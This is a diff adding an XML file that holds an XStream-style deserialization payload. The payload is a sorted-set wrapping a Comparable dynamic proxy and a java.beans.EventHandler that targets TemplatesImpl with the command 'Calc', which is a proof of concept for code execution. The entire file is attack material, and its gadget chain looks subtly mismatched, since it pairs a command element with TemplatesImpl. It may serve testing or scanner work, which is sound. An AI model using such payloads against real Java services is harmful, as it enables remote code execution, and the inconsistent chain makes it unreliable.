@@ -1,0 +1,13 @@
+<sorted-set>
+    <dynamic-proxy>
+        <interface>java.lang.Comparable</interface>
+        <handler class="java.beans.EventHandler">
+            <target class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl">
+                <command>
+                    <string>Calc</string>
+                </command>
+            </target>
+            <action>newTransformer</action>
+        </handler>
+    </dynamic-proxy>
+</sorted-set>
